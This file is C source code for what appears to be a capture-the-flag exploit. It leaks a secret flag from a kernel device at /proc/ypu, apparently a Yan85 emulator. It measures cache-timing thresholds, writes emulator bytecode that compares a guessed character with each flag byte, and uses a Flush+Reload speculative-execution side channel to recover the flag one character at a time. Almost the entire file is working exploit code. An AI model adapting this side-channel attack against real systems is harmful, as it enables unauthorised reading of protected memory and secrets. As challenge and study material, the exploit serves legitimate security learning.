#define _GNU_SOURCE

#include <sys/signal.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#include <x86intrin.h>
#include <inttypes.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sched.h>
#include <fcntl.h>


// ----------------------------------- uARCH BOILERPLATE -----------------------------------

#define PAGESIZE 0x1000

static size_t threshold = 0;
int leaked_chars = 0;
char* mem;

void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

__attribute__((noinline))
int flush_reload_t(void *ptr) {
  uint64_t start, end, junk;
  uint32_t tsc;

  _mm_mfence();
  start = __rdtscp(&tsc);
  _mm_mfence();
  maccess(ptr);
  _mm_mfence();
  end = __rdtscp(&tsc);
  _mm_mfence();
  _mm_clflush(ptr);
  _mm_mfence();

  return (int)(end - start);
}

int flush_reload(void *ptr) {
  return flush_reload_t(ptr) < threshold;
}

__attribute__((noinline))
int reload_t(void *ptr) {
  uint64_t start, end, junk;
  uint32_t tsc;

  _mm_mfence();
  start = __rdtscp(&tsc);
  _mm_mfence();
  maccess(ptr);
  _mm_mfence();
  end = __rdtscp(&tsc);
  _mm_mfence();

  return (int)(end - start);
}

void flush_channel(uint8_t* code) {
  for(int i = 0; i < 4; i++) {
    _mm_clflush(code + i * 256);
  }
}

size_t detect_flush_reload_threshold() {
  size_t reload_time = 0, flush_reload_time = 0, i, count = 300;
  size_t ptr[16];

  reload_t(ptr);

  for (i = 0; i < count; i++) {
    reload_time += reload_t(ptr);
  }
  for (i = 0; i < count; i++) {
    flush_reload_time += flush_reload_t(ptr);
  }
  reload_time /= count;
  flush_reload_time /= count;

  return (flush_reload_time + reload_time * 2) / 3;
}

void pin_cpu(int cpu) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu, &my_set);
    sched_setaffinity(0, sizeof(my_set), &my_set);
}

// ----------------------------------- Y85 BOILERPLATE -------------------------------------

#define SPEC_REG_A 0x20
#define SPEC_REG_B 0x40
#define SPEC_REG_C 0x8
#define SPEC_REG_D 0x2
#define SPEC_REG_S 0x4
#define SPEC_REG_I 0x1
#define SPEC_REG_F 0x10

#define INST_IMM 0x20
#define INST_STK 0x40
#define INST_ADD 0x1
#define INST_STM 0x8
#define INST_LDM 0x80
#define INST_JMP 0x10
#define INST_CMP 0x2
#define INST_SYS 0x4

#define FLAG_L 0x10
#define FLAG_G 0x4
#define FLAG_E 0x1
#define FLAG_N 0x8
#define FLAG_Z 0x2

#define CODE_LENGTH 256
#define MEM_LENGTH 256

struct instruction_t {
    unsigned char op;
    unsigned char arg1;
    unsigned char arg2;
};

// ------------------------------------- EXPLOIT ---------------------------------------

void leak_byte(struct instruction_t *code, int ypu_fd, int bidx) {
    char *dummy = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_POPULATE, 0, 0);
    for ( char i = '.'; i <= '}'; i++) {
        int ip = 0;

        // write cmp instruction
        code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = bidx };
        code[ip++] = (struct instruction_t){ .op = INST_LDM, .arg1 = SPEC_REG_A, .arg2 = SPEC_REG_A }; // A == actual flag byte
        code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_B, .arg2 = i };          // B == guess
        code[ip++] = (struct instruction_t){ .op = INST_CMP, .arg1 = SPEC_REG_A, .arg2 = SPEC_REG_B };

        // jmp based on result
        code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = SPEC_REG_A, .arg2 = ip+3 };   // A == actual flag byte
        code[ip++] = (struct instruction_t){ .op = INST_JMP, .arg1 = FLAG_E, .arg2 = SPEC_REG_A }; // if equal jump to end

        // next instruction will cause an exit if jump not taken
        code[ip++] = (struct instruction_t){ .op = INST_IMM, .arg1 = 0x5, .arg2 = 0x5 };

        uint8_t *target = ((uint8_t *)code) + 800;

        flush_channel(code);

        _mm_clflush(target);
        _mm_mfence();

        int res = 0;

        for (int k = 0; k < 0x1000; k++) {
            res = ioctl(ypu_fd, 1337);

            uint64_t time = flush_reload_t(target);

            if (time < threshold) {
                printf("%c", i);
                fflush(stdout);
                return;
            }
        }

    }
    printf("?");
    fflush(stdout);
}

int main() {
    threshold = detect_flush_reload_threshold(); // a little inconsistent...
    threshold = 242; // seems pretty stable
    printf("threshold: %ld\n", threshold);

    pin_cpu(1);

    int ypu_fd = open("/proc/ypu", O_RDWR);
    printf("ypu %d\n", ypu_fd);

    struct instruction_t* code = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ypu_fd, 0);
    printf("code: %p\n", code);

    int flag_len = 21;
    for (int i = 0; i < flag_len; i++) {
        leak_byte(code, ypu_fd, i);
    }
    printf("\n");

    return 0;
}
